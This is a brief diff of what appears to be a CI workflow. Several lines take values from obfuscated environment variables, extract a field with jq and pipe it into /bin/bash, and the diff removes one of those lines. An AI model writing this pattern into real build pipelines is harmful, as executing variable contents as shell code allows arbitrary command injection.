@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$ii32178" | jq -r .nun9742 | /bin/bash
           echo $ih711 | jq -r .oq69 | /bin/bash
           echo $pnn11045 | jq -r .bkmku2 | /bin/bash
-          echo $aik7 | jq -r .utayg6227 | /bin/bash
           echo $b8416 | jq -r .q0483 | /bin/bash
 
       - name: Upload archive
